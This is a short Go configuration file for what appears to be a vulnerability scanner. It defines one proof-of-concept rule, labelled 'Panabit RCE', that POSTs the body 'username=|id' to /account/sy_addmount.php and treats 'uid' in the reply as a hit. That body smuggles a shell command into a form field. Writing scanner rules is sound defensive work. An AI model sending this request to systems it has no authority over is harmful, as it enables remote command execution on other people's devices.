package config

type Instr struct {
	ContainStr string
}

type PocRule struct {
	Rank      string
	Name      string
	Method    string
	Path      string
	Header    map[string]string
	Body      string
	StrVerity Instr
}

var PocRules = []PocRule{
	{"1", "Panabit RCE", "POST", "/account/sy_addmount.php", nil, "username=|id", Instr{"uid"}},
}
